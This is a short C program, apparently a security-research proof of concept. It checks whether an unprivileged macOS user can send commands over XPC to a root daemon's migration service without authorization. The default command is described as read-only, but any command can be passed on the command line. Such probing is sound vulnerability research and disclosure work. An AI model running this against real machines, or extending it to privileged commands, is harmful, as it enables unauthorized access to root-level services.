// IOMFB_bics_daemon migration XPC probe — confirm uid501 (unentitled) can invoke the root daemon's
// privileged migration API with no authorization. GetMigrationState is read-only (safe).
#include <stdio.h>
#include <xpc/xpc.h>
#include <dispatch/dispatch.h>
#include <string.h>
int main(int argc,char**argv){
  const char* cmd = argc>1?argv[1]:"GetMigrationState";
  xpc_connection_t c=xpc_connection_create_mach_service("com.apple.iomfb_bics_daemon.migration",NULL,0);
  if(!c){printf("create failed\n");return 1;}
  xpc_connection_set_event_handler(c,^(xpc_object_t e){
    if(xpc_get_type(e)==XPC_TYPE_ERROR){
      const char* d=xpc_dictionary_get_string(e,XPC_ERROR_KEY_DESCRIPTION);
      printf("conn event: ERROR %s\n", d?d:"?");
    }
  });
  xpc_connection_resume(c);
  // try both "type"=<cmd> and a couple key variants the strings suggested
  xpc_object_t m=xpc_dictionary_create(NULL,NULL,0);
  xpc_dictionary_set_string(m,"type",cmd);
  printf("sending {type=%s} to com.apple.iomfb_bics_daemon.migration (uid=%d)\n",cmd,getuid());
  xpc_object_t r=xpc_connection_send_message_with_reply_sync(c,m);
  if(xpc_get_type(r)==XPC_TYPE_ERROR){
    printf("REPLY: ERROR %s\n", xpc_dictionary_get_string(r,XPC_ERROR_KEY_DESCRIPTION));
  } else {
    char* desc=xpc_copy_description(r);
    printf("REPLY (uid501 REACHED the root migration API — no auth): %s\n", desc);
    free(desc);
  }
  return 0;
}
